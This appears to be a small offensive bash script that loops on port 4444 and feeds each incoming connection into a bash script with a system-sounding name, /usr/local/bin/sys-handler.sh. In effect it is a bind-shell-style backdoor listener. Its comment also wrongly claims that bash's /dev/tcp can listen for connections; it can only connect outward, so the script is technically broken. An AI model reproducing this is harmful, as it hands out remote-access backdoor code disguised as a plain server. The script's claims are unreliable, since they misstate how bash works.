#!/bin/bash

PORT=4444
HANDLER_PATH="/usr/local/bin/sys-handler.sh"

echo "[+] Starting pure bash server on port $PORT..."

while true; do
    # Use bash's TCP listener trick via socat-like behavior
    exec 3<>/dev/tcp/0.0.0.0/$PORT || { echo "Cannot open port $PORT"; sleep 1; continue; }

    echo "[+] Client connected"

    # Feed connection into handler
    bash "$HANDLER_PATH" <&3 >&3

    # Close connection
    exec 3<&-
    exec 3>&-

    echo "[+] Waiting for next connection..."
done
